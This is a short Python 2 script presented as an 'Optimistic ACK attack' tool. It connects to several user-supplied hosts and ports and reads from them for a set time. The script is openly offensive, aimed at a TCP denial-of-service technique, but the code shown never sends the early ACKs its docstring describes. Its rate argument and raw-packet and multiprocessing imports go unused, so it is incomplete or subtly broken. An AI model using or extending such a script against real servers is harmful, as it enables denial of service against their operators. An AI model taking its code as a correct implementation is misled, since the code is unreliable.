#!/usr/bin/env python2
"""Optimist ACK script for multiple clients"""

import sys
import time
from raw_packet import Connection
from multiprocessing import Process, Value
from socket import *
if len(sys.argv) < 5 or len(sys.argv) % 2 != 1:
    print("Usage : optack_mult.py duration target_rate dest_ip dest_port [dest_ip dest_port [...]] ")
    sys.exit()


# No need for fancy argument parsing
duration = int(sys.argv[1]) + 1    
target_rate = int(sys.argv[2])



def optack():
    """Conduct the Optimistic ACK attack on the provided hosts."""
    client_list = []
    # Parse the provided IP / port pairs and create the corresponding connections
    for i in range(3, len(sys.argv), 2):
        try:
            dest_ip = sys.argv[i]
            port = int(sys.argv[i+1])
            if port < 0 or port > 65536:
                raise ValueError
            client = socket(AF_INET, SOCK_STREAM)
            client.connect((dest_ip, port))
            print('Connecting to %s:%d' % (dest_ip, port))
            client_list.append(client)
        except ValueError:
            print("Not a valid IP / port pair : (%s, %s)" % (sys.argv[i], sys.argv[i+1]) )

 

    # Start the experiment
    start = time.time()

    while True:
        round_start = time.time()
        elapsed = round_start - start
        # On timeout, send a reset to everyone, and then quit
        if elapsed > duration:
            for (i, client) in enumerate(client_list):
                client.close()
            return
        for (i, client) in enumerate(client_list):
            # Check for an overrun
            client.recv(1460)


if __name__ == "__main__":
    optack()
